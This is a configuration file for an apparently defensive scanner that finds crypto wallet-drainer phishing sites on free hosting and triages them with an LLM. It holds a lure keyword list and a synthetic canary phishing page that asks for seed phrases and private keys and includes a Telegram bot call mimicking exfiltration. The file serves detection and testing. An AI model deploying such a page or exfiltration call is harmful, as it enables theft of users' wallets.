/**
 * Every knob lives here. There are deliberately no CLI flags and no config
 * files — if something needs to change, change the constant.
 */
import { fileURLToPath } from 'node:url';

// ── stage 1: /repositories walk ─────────────────────────────────────────────
/**
 * How far back to look. Runs every 2 hours (see the workflow), so a 4 hour
 * window is two cadences deep: it takes two consecutive skipped or failed runs
 * for a repo to go unseen, and Actions skips and delays routinely.
 *
 * Six hours was tried and reverted. It gives a third look, but a full 6 hour
 * walk is ~978 requests and the workflow token allows 1,000 an hour per
 * repository — so one manual dispatch landing in the same hour as the schedule
 * would exhaust the budget, and the rate-limit guard responds by sleeping until
 * reset. Trading a rare two-consecutive-failure gap for a plausible hour-long
 * hang is a bad trade.
 *
 * The resulting 2x overlap is not waste. A repo enters the walk when it is
 * created, but the deployment often lands later, so the second look at a repo
 * is the one that finds a site that was not live the first time. Duplicate
 * findings cost nothing downstream: the site dedupes by label.
 *
 * Deeper overlap is not waste here: a repo enters the walk when it is created,
 * but its deployment record appears later, so the second and third look are the
 * ones that find a site the first pass could not have seen.
 */
export const WINDOW_HOURS = 4;
/** GitHub's search index lags reality; never treat the last N minutes as head. */
export const HEAD_LAG_MINUTES = 15;
/**
 * Requests to keep in reserve. The walk stops rather than spends the last of
 * the token's hourly allowance, so hydration of what it already collected can
 * still finish.
 *
 * This replaces a REPO_LIMIT cap. That cap was meant to stop a mis-set window
 * from exhausting the budget, but it decided coverage as a side effect and did
 * it silently: at 12,200 new public repos an hour a 4 hour window needs ~6,240
 * per shard, the cap allowed 6,250, and six of eight shards were quietly
 * stopping early. Guarding the budget directly leaves the window as the only
 * thing that governs coverage, and a run that does run short says so.
 */
export const REQUEST_RESERVE = 60;
/** Parallel walkers, each covering an equal slice of the repo-id range. */
export const WALK_SHARDS = 8;
/** GraphQL node hydration: 300 nodes = 1 rate-limit point. */
export const HYDRATE_BATCH = 300;

// ── stage 2: candidate URLs ─────────────────────────────────────────────────
/** Homepage path: these hosts are free, instant, and disposable. */
export const FREE_HOSTS = /\.(vercel\.app|netlify\.app|pages\.dev|github\.io)$/i;
/** Name path: what we append to a normalized repo name to guess a deployment. */
export const GUESS_HOST_SUFFIX = 'vercel.app';
/** Names <= 6 chars collide with unrelated deployments (measured ~27% FP). */
export const MIN_GUESS_NAME_LENGTH = 7;

/**
 * The lure vocabulary. Guessing a deployment for every new repo means ~35,000
 * requests at one provider, which vercel's edge answers by resetting every
 * connection from the source IP after a few hundred. So the name has to earn
 * the probe, and this is the filter that decides.
 *
 * Split by how the word behaves in a real name, not by category. Drainer repos
 * glue their words together — `dappmainnet`, `secureddapps`, `helpchat` — so
 * anything that shows up mid-compound has to match as a substring. Short or
 * ambiguous tokens get \b instead, which keeps `dex-aggregator` and `eth-wallet`
 * while dropping `codex`, `index`, `nodejs`, `electron` and `automatic`.
 *
 * Separators are normalized to `-` before matching, because JS treats `_` as a
 * word character and `\bbank\b` would otherwise miss `bank_loan`.
 */
const LURE_ANYWHERE = [
  // wallets and the brands drainers impersonate
  'wallet', 'metamask', 'phantom', 'trezor', 'exodus', 'safepal', 'walletconnect',
  'coinbase', 'binance', 'kraken', 'bybit', 'kucoin', 'bitget', 'blockfi', 'ledger',
  // the vocabulary of crypto product pages
  'crypto', 'bitcoin', 'ethereum', 'solana', 'arbitrum', 'polygon', 'blockchain',
  'mainnet', 'testnet', 'web3', 'dapp', 'defi', 'airdrop', 'presale', 'launchpad',
  'staking', 'liquidity', 'whitelist', 'bridge', 'swap',
  // what the lure asks the visitor to do
  'claim', 'restore', 'recover', 'validat', 'verif', 'migrat', 'unlock', 'rectif',
  'activate', 'authoriz', 'redeem', 'withdraw', 'resolve', 'reactivat',
  // trust and support framing
  'secure', 'protect', 'support', 'helpdesk', 'help', 'refund', 'reward',
  'giveaway', 'bonus',
  // money
  'bank', 'finance', 'financial', 'invest', 'trading', 'exchange', 'payment',
  'paypal', 'vault', 'treasury',
  // credentials
  'login', 'signin', 'password', 'mnemonic', 'privatekey', 'keystore', 'recovery',
];

/** Short or ambiguous — these need boundaries or they match half of GitHub. */
const LURE_BOUNDED = [
  'dex', 'eth', 'btc', 'bnb', 'sol', 'nft', 'ido', 'ico', 'otp', 'kyc', 'node',
  'tron', 'matic', 'avax', 'coin', 'token', 'mint', 'stake', 'seed', 'phrase',
  'sync', 'auth', 'account', 'fund', 'funds', 'pay', 'trust', 'chat', 'assist',
  'guard', 'asset', 'assets', 'capital', 'gift', 'prize', 'winner', 'trader',
];

export const LURE = new RegExp(
  [...LURE_ANYWHERE, ...LURE_BOUNDED.map((word) => `\\b${word}\\b`)].join('|'),
  'i',
);

const LURE_GLOBAL = new RegExp(LURE.source, 'gi');

/** True when a name is worth spending a request on. */
export function looksLikeLure(name: string): boolean {
  return LURE.test(name.replace(/[._]+/g, '-'));
}

/**
 * How many distinct lure words a name contains. Used to order the queue, not
 * to filter it: when a provider only lets a few dozen requests through, those
 * requests should go to `wallet-restore-sync` before `study-sync-app`, and
 * ordering is the only lever that survives an arbitrary budget.
 */
export function lureScore(name: string): number {
  const normalized = name.replace(/[._]+/g, '-');
  return new Set([...normalized.matchAll(LURE_GLOBAL)].map((m) => m[0].toLowerCase())).size;
}

// ── stage 3: liveness ───────────────────────────────────────────────────────
export const LIVE_STATUSES = new Set([200, 301, 302, 307, 308, 401, 403]);
/**
 * Hosts that mean "this deployment is password-protected", not "this is the
 * site". A Vercel deployment with protection enabled 307s to
 * vercel.com/login?next=/sso-api…, and because the probe follows redirects we
 * would otherwise fetch Vercel's own 481 KB login page and hand it to the
 * classifier as the candidate's content. That produced a confident
 * "generic-credential-phish" verdict on Vercel's actual login screen.
 *
 * Attributing another host's page to this repo is the same failure as
 * inheriting a fork's homepage: it names the wrong owner.
 */
export const PROTECTION_HOSTS = [
  'vercel.com',
  'vercel.app/sso',
  'netlify.com',
  'app.netlify.com',
  'github.com',
  'cloudflareaccess.com',
];
/** x-vercel-error: DEPLOYMENT_DISABLED — free ground truth that someone got there first. */
export const TAKEDOWN_STATUS = 451;
export const PROBE_CONCURRENCY = 64;
/**
 * Workers for rate-limited providers. Their throughput is set by the limiter,
 * not by this, so it only needs enough in flight to keep the bucket drained —
 * and it runs as a separate lane so a paced provider cannot stall an unpaced
 * one. github.io is the bulk of the candidates and has never rationed anything.
 */
export const PACED_CONCURRENCY = 12;
export const PROBE_TIMEOUT_MS = 20_000;

// ── stage 4: dossier ────────────────────────────────────────────────────────
export const FETCH_CONCURRENCY = 24;
export const FETCH_TIMEOUT_MS = 20_000;
/** Largest body we will read. Real pages in the wild have hit 4.3 MB. */
export const MAX_BODY_BYTES = 2_000_000;
/** Below this much visible text the page is an SPA shell — the signal is in the bundle. */
export const SPA_SHELL_TEXT_BYTES = 1500;
/** How many <script src> bundles to pull per SPA shell. */
export const MAX_BUNDLES = 3;
/**
 * Ceiling on the extracted corpus. A 2 MB bundle can yield megabytes of string
 * literals, and thousands of those at once will not fit in a runner. Signal is
 * front-loaded — the canary's whole harvester surfaced in the first 40k chars.
 */
export const MAX_CORPUS_CHARS = 250_000;
/** Ceiling on the rendered dossier handed to the LLM. */
export const DOSSIER_MAX_CHARS = 9000;
/**
 * Cap on shipping the page's own source to the classifier alongside the
 * dossier.
 *
 * The dossier lists what a page asks for but not where the answer goes, and
 * that is the question — a login whose password is read and discarded into
 * localStorage is a hobby site, one that posts it to a webhook is a trap, and
 * the two are indistinguishable from a field list. Rather than hand-rolling a
 * dataflow analysis that would be confidently wrong, give the model the file:
 * these pages are single-file and small (3-63 KB observed), and at V4 Flash
 * prompt rates that is fractions of a cent per call.
 *
 * Bundled SPAs are excluded by size on purpose. A 468 KB bundle is ~95%
 * library code, so it buys noise; the literal extraction already distils those
 * and the dossier now labels bundle strings as such.
 *
 * This changes nothing before the LLM: rules still score `corpus`, so lane
 * selection and thresholds are untouched.
 */
export const LLM_SOURCE_MAX_CHARS = 200_000;
/**
 * Per-bundle ceiling for shipping a script's source rather than only its string
 * literals. Sized to separate hand-written scripts from frameworks: a tracking
 * beacon is ~2 KB and contains its whole purpose in readable form, while a
 * Next.js or ethers bundle is hundreds of KB of library code that adds nothing.
 *
 * Prompted by a page whose entire dossier was 718 characters because the
 * exfiltration lived in an external 2 KB file. Literals told the classifier a
 * Telegram endpoint existed; the source would have shown it sending the
 * visitor's IP on page load.
 */
export const BUNDLE_SOURCE_MAX_CHARS = 32_000;
export const DOSSIER_MAX_EVIDENCE_LINES = 60;

// ── stage 5: detection ──────────────────────────────────────────────────────
/** Rule weight needed for the content lane to forward a site to triage. */
export const CONTENT_SCORE_THRESHOLD = 3;

// ── stage 6: LLM triage ─────────────────────────────────────────────────────
export const LLM_BASE_URL = 'https://crof.ai/v1';
export const LLM_MODEL = 'deepseek-v4-flash-0731';
export const LLM_REASONING_EFFORT = 'low';
/**
 * No max_tokens on purpose. It is a reasoning model, so the cap is shared with
 * reasoning_content, and a dossier that provokes a long deliberation spends the
 * whole allowance before writing any JSON — the answer comes back truncated and
 * the verdict is lost. The real bound is LLM_TIMEOUT_MS; a runaway generation
 * costs a fraction of a cent, a silently dropped verdict costs a drainer.
 */
export const LLM_CONCURRENCY = 6;
export const LLM_TIMEOUT_MS = 120_000;
/** A site reaches the analyst queue at verdict=malicious and at least this much confidence. */
export const LLM_MIN_CONFIDENCE = 0.7;

// ── stage 7: output ─────────────────────────────────────────────────────────
/**
 * Always the repo-root `out/`, whatever the cwd. It is committed: the history
 * of this directory *is* the record, and the site is built from it.
 */
export const OUT_DIR = fileURLToPath(new URL('../../../out', import.meta.url));

// ── misc ────────────────────────────────────────────────────────────────────
export const USER_AGENT =
  'no-place-for-drainers/1.0 (defensive security research; abuse reporting)';
/** Injected every run to prove acquisition works end to end. Probed first. */
export const CANARY_URLS = ['https://defixs-finance.vercel.app'];

/**
 * The offline canary: a synthetic page run through extraction, rules and the
 * LLM with no network at all.
 *
 * The live canary can only report on a run where its provider answered us. When
 * vercel blocks the runner it goes unprobed, and "canary missed" then means
 * either "the scanner is broken" or "vercel said no" — two states that need
 * opposite responses. This one is always reachable, so the two questions
 * separate: can we still recognise a drainer, and separately, can we still
 * reach any.
 */
export const OFFLINE_CANARY_HTML = `<!doctype html><html><head>
<title>Wallet Sync — Restore Access</title>
<meta name="description" content="Validate your wallet to restore access to your assets.">
</head><body>
<h1>Irregular balance detected</h1>
<p>Connect your wallet to rectify the issue and claim your airdrop.</p>
<button>MetaMask</button><button>Trust Wallet</button><button>Coinbase Wallet</button>
<form>
<label>Secret Recovery Phrase</label>
<input name="seedPhrase" placeholder="Enter your 12 or 24-word recovery phrase">
<label>Private Key</label>
<input name="privateKey" type="password" placeholder="Enter your private key">
</form>
<script>fetch('https://api.telegram.org/bot123456789:AAxxxxxxxx/sendMessage?chat_id=1', {method:'POST'});</script>
</body></html>`;
